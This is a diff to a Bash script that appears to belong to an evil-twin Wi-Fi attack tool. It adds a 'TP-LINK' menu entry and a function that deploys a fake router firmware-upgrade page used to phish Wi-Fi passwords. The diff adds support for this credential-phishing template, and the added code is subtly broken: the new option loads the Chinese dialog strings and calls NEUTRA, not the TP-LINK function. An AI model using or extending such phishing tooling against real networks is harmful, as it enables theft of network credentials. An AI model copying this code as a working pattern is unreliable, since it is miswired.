@@ -3564,10 +3564,11 @@ function webinterface {
 			echo -e "$blue""11)"$transparent" Vodafone    [ESP]"
 			echo -e "$blue""12)"$transparent" Italian     [IT]"
 			echo -e "$blue""13)"$transparent" French      [FR]"
-			echo -e "$blue""13)"$transparent" Portuguese  [POR]"
+			echo -e "$blue""14)"$transparent" Portuguese  [POR]"
 			echo -e "$blue""15)"$transparent" German      [GER]"
 			echo -e "$blue""16)"$transparent" Chinese     [ZH_CN](NEUTRA)"
-			echo -e "$blue""17)"$transparent"\e[1;31m $general_back"$transparent""
+            echo -e "$blue""17)"$transparent" TP-LINK     [ENG]"
+		    echo -e "$blue""18)"$transparent"\e[1;31m $general_back"$transparent""
 			echo
 			echo -n "#? "
 			read fluxass
@@ -3692,8 +3693,20 @@ function webinterface {
 				NEUTRA
 				break
 
-
             elif [ "$fluxass" = "17" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ZH
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ZH
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ZH
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_ZH
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ZH
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ZH
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ZH
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ZH
+				NEUTRA
+				break
+
+
+            elif [ "$fluxass" = "18" ]; then
 				continue
 			fi
 
@@ -7135,6 +7148,15 @@ mkdir $DUMP_PATH/data &>$flux_output_device
         cp  $WORK_DIR/Sites/ARRIS-ENG/error.html $DUMP_PATH/data
         cp  $WORK_DIR/Sites/ARRIS-ENG/final.html $DUMP_PATH/data
         cp  $WORK_DIR/Sites/ARRIS-ENG/index.htm $DUMP_PATH/data
+
+	              }
+
+	# Crea el contenido de la interface web
+function Upgrade-TP-LINK {
+mkdir $DUMP_PATH/data &>$flux_output_device
+        cp  $WORK_DIR/Sites/Upgrade-TP-LINK/bootstrap.min.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Upgrade-TP-LINK/index.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Upgrade-TP-LINK/upgrading.html $DUMP_PATH/data
 
 	              }
 
